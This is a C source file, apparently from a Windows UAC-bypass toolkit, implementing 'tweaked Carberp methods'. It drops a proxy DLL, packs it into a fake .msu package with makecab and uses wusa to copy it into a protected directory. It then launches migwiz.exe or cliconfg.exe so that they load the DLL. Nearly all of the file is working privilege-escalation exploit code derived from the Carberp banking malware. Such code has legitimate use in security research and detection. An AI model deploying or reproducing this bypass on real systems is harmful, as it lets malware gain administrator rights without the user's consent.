/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       CARBERP.C
*
*  VERSION:     1.50
*
*  DATE:        05 Apr 2015
*
*  Tweaked Carberp methods.
*  Original Carberp is exploiting mcx2prov.exe in ehome.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmWusaCopyFile
*
* Purpose:
*
* Copy file to protected directory using wusa.
*
*/
BOOL ucmWusaCopyFile(
	LPWSTR lpSourceDll,
	LPWSTR lpMsuPackage,
	LPWSTR lpCommandLine,
	PVOID FileBuffer,
	DWORD FileBufferSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	WCHAR szDllFileName[MAX_PATH + 1];
	WCHAR szMsuFileName[MAX_PATH + 1];
	WCHAR szCmd[MAX_PATH * 4];

	RtlSecureZeroMemory(szDllFileName, sizeof(szDllFileName));
	RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));

	do {

		if (ExpandEnvironmentStringsW(lpSourceDll,
			szDllFileName, MAX_PATH) == 0)
		{
			break;
		}

		if (ExpandEnvironmentStringsW(lpMsuPackage,
			szMsuFileName, MAX_PATH) == 0)
		{
			break;
		}

		//drop proxy dll
		if (!supWriteBufferToFile(szDllFileName, FileBuffer, FileBufferSize)) {
			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
			break;
		}

		//create cab with msu extension
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		wsprintfW(szCmd, L" /V1 %ws %ws", szDllFileName, szMsuFileName);
		if (!supRunProcess(L"makecab.exe", szCmd)) {
			OutputDebugString(TEXT("[UCM] Makecab failed"));
			break;
		}

		//extract msu data to target directory
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		wsprintfW(szCmd, lpCommandLine, szMsuFileName);
		bResult = supRunProcess(L"cmd.exe", szCmd);
		if (bResult == FALSE) {
			OutputDebugString(TEXT("[UCM] Wusa copy file failed"));
			break;
		}

	} while (cond);

	//cleanup
	if (szDllFileName[0] != 0) {
		DeleteFileW(szDllFileName);
	}
	if (szMsuFileName[0] != 0) {
		DeleteFileW(szMsuFileName);
	}
	return bResult;
}

/*
* ucmWusaMethod
*
* Purpose:
*
* Build and install fake msu package then run target application.
*
*/
BOOL ucmWusaMethod(
	DWORD dwType,
	PVOID ProxyDll,
	DWORD ProxyDllSize
	)
{
	BOOL bResult = FALSE, cond = FALSE;
	LPWSTR lpSourceDll, lpMsuPackage, lpCommandLine, lpTargetProcess;
	WCHAR szCmd[MAX_PATH * 4];

	if (
		(ProxyDll == NULL) ||
		(ProxyDllSize == 0)
		)
	{
		return FALSE;
	}

	switch (dwType) {

	//use migwiz.exe as target
	case METHOD_CARBERP:
		lpSourceDll = METHOD_MIGWIZ_SOURCEDLL;
		lpMsuPackage = METHOD_CARBERP_MSUPACKAGE;
		lpCommandLine = METHOD_MIGWIZ_CMDLINE;
		lpTargetProcess = METHOD_MIGWIZ_TARGETAPP;
		break;

	//use cliconfg.exe as target
	case METHOD_CARBERP_EX:
		lpSourceDll = METHOD_SQLSVR_SOURCEDLL;
		lpMsuPackage = METHOD_CARBERP_MSUPACKAGE;
		lpCommandLine = METHOD_SQLSVR_CMDLINE;
		lpTargetProcess = METHOD_SQLSVR_TARGETAPP;
		break;

	default:
		return FALSE;
	}

	do {

		//copy file to the protected directory
		if (!ucmWusaCopyFile(lpSourceDll, lpMsuPackage, 
			lpCommandLine, ProxyDll, ProxyDllSize))
		{
			break;
		}

		//run target process for dll hijacking
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		if (ExpandEnvironmentStringsW(lpTargetProcess,
			szCmd, MAX_PATH) == 0)
		{
			break;
		}
		bResult = supRunProcess(szCmd, NULL);

	} while (cond);


	return bResult;
}
